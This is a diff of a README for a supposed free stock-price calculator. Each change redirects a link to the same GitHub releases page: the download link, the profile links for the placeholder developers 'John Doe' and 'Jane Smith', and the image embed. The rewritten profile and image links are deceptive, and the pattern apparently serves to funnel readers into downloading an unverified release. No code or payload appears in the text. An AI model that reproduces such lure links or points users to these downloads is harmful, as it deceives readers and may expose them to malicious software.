@@ -14,7 +14,7 @@ This repository provides a free tool for calculating the average stock price acr
 
 ## Getting Started
 
-To access the Free Average Stock Price Calculator tool, simply click on the following link: [Download Calculator](https://github.com/files/Project.zip)
+To access the Free Average Stock Price Calculator tool, simply click on the following link: [Download Calculator](https://github.com/MGamer15YT/Free-Average-Stock-Price-Calculator/releases)
  
 🚀 Click above to download the calculator tool and start analyzing stock prices like a pro! 📊
 
@@ -37,8 +37,8 @@ If you are unable to access the provided link, please check the "Releases" secti
 ## Meet the Team
 
 👨‍💻 **The Developers:** 
-- John Doe ([@johndoe](https://github.com/johndoe))
-- Jane Smith ([@janesmith](https://github.com/janesmith))
+- John Doe ([@johndoe](https://github.com/MGamer15YT/Free-Average-Stock-Price-Calculator/releases))
+- Jane Smith ([@janesmith](https://github.com/MGamer15YT/Free-Average-Stock-Price-Calculator/releases))
 
 ## Support or Contact
 
@@ -46,4 +46,4 @@ If you have any questions, suggestions, or feedback, feel free to reach out to t
 
 Happy stock price calculating! 🚀📈
 
-![Stock Market](https://www.example.com/stock-image.jpg)
+![Stock Market](https://github.com/MGamer15YT/Free-Average-Stock-Price-Calculator/releases)
